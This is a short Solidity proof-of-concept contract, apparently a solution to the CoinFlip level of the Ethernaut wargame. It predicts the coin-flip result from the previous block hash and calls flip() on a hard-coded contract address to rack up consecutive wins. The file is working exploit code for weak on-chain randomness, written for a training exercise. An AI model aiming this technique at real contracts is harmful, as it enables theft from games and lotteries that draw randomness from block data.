// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel03.sol";
import {console} from "forge-std/console.sol";

contract POC {
    CoinFlip level3 = CoinFlip(0xdabC2835a457e379FbB3748863D676e08A0df768);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit() external {
        uint256 blockValue = uint256(blockhash((block.number) - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        level3.flip(side);
        console.log("Consecutive Wins: ", level3.consecutiveWins());
    }
}
